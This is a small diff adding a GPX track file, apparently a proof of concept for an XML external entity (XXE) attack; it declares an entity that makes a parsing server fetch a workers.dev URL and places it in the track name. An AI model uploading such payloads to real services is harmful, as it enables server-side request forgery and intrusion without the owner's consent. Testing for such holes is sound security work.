@@ -1,0 +1,9 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE gpx [
+  <!ENTITY xxe SYSTEM "http://gyorem-otp.shzsy-audit-86.workers.dev/api/otp/nonexistent">
+]>
+<gpx version="1.1" creator="stay22-poc">
+  <trk>
+    <name>&xxe;</name>
+  </trk>
+</gpx>
